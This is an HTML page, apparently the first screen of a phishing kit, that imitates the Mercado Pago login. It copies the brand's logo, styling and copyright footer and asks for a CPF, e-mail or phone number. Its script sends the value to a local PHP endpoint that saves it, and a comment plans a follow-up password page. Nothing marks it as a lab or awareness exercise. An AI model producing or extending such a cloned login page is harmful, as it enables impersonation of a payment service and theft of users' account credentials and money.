<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Digite seu CPF, e-mail ou telefone</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; background-color: #f5f5f5; margin: 0; display: flex; flex-direction: column; min-height: 100vh; }
        .main-container { flex-grow: 1; display: flex; align-items: center; justify-content: center; }
        .login-box { background-color: white; padding: 48px; border-radius: 6px; box-shadow: 0 1px 4px 0 rgba(0,0,0,.1); width: 100%; max-width: 320px; text-align: center; }
        header { background-color: #009ee3; padding: 12px 0; text-align: center; }
        header img { height: 32px; }
        h1 { font-size: 24px; font-weight: 500; color: #333; margin-top: 0; margin-bottom: 24px; }
        .input-group { position: relative; margin-bottom: 16px; }
        .input-field { width: 100%; padding: 16px; font-size: 16px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
        .btn-continue { width: 100%; background-color: #3483fa; color: white; border: none; padding: 16px; font-size: 16px; font-weight: 600; border-radius: 6px; cursor: pointer; transition: background-color 0.2s; }
        .btn-continue:hover { background-color: #2968c8; }
        .link { color: #3483fa; text-decoration: none; font-size: 14px; display: inline-block; margin-top: 16px; }
        footer { text-align: center; padding: 24px; font-size: 12px; color: #888; }
    </style>
</head>
<body>
    <header>
        <img src="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/5.21.22/mercadolibre/logo__large_plus.png" alt="Mercado Pago">
    </header>

    <main class="main-container">
        <div class="login-box">
            <h1>Digite seu CPF, e-mail ou telefone para iniciar sessão</h1>
            <form id="form-identificador">
                <div class="input-group">
                    <input type="text" id="identificador" class="input-field" placeholder="CPF, e-mail ou telefone" required>
                </div>
                <button type="submit" class="btn-continue">Continuar</button>
            </form>
            <a href="#" class="link">Criar conta</a>
        </div>
    </main>
    
    <footer>
        Como cuidamos da sua privacidade - Copyright © 1999-2025.
    </footer>

    <script>
        document.getElementById('form-identificador').addEventListener('submit', async (e) => {
            e.preventDefault(); // Impede o envio tradicional do formulário
            const identificador = document.getElementById('identificador').value;
            const btn = e.target.querySelector('button');
            btn.disabled = true;
            btn.textContent = 'Aguarde...';

            try {
                const response = await fetch('api_salvar_identificador.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ identificador: identificador })
                });

                const result = await response.json();

                if (result.success) {
                    // SUCESSO! Em um projeto real, você redirecionaria para a tela de senha.
                    // Exemplo: window.location.href = '/senha.php?id=' + result.id;
                    alert('Identificador salvo! Próximo passo seria a tela de senha.');
                } else {
                    alert('Erro: ' + result.error);
                }

            } catch (error) {
                console.error('Falha na comunicação:', error);
                alert('Não foi possível conectar ao servidor.');
            } finally {
                btn.disabled = false;
                btn.textContent = 'Continuar';
            }
        });
    </script>
</body>
</html>